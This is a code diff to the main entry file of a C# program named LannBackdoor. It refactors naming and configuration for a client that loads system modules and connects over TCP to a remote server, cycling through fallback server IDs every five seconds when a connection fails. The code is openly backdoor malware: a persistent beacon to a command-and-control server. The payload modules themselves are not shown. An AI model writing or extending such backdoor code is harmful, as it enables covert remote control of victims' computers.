@@ -1,11 +1,8 @@
-﻿using System.Net.Sockets;
-using System.Reflection;
-using LannLogger;
+﻿using LannLogger;
 using LannUtils;
 using ModulesApi;
 using Networking;
 using Networking.Packets;
-using Newtonsoft.Json.Linq;
 using Serilog.Core;
 using SystemModule;
 using Constants = LannConstants.Constants;
@@ -15,17 +12,17 @@ namespace LannBackdoor;
 public static class LannBackdoor {
     private static readonly Logger Logger = LoggerFactory.CreateLogger("LannBackdoor");
     private static TCPClient _tcpClient = null!;
-    private static int serverId;
+    private static int _serverId;
 
-    public static async Task Main(string[] args) {
+    public static async Task Main() {
         Console.OutputEncoding = System.Text.Encoding.UTF8;
         
-        if(Constants.DEBUG) Logger.Debug("Running {Mode} mode", "DEBUG");
+        if(Constants.Debug) Logger.Debug("Running {Mode} mode", "DEBUG");
         Logger.Information("Ohayou, ばか!");
         Logger.Information("Config:\n  - Debug: {Debug}\n  - Url: {URL}\n  - Port: {Port}",
-            true,
-            "127.0.0.1",
-            2022);
+            Constants.Debug,
+            Utils.CreateUrl(_serverId),
+            Constants.Port);
 
         ModuleRegistry.LoadByAssembly(typeof(SystemModuleImpl).Assembly);
         await Connect();
@@ -34,7 +31,7 @@ public static class LannBackdoor {
     }
 
     private static async Task Connect() {
-        _tcpClient = new TCPClient(Utils.CreateURL(serverId), Constants.PORT);
+        _tcpClient = new TCPClient(Utils.CreateUrl(_serverId), Constants.Port);
 
         _tcpClient.OnConnect += async (_, _) => {
             Logger.Information("Connected!");
@@ -89,7 +86,7 @@ public static class LannBackdoor {
         try {
             await _tcpClient.Connect();
         } catch {
-            Logger.Information("Connection failed, connecting to server {Id} in 5000 ms", ++serverId);
+            Logger.Information("Connection failed, connecting to server {Id} in 5000 ms", ++_serverId);
             await Task.Delay(5000);
             await Connect();
         }
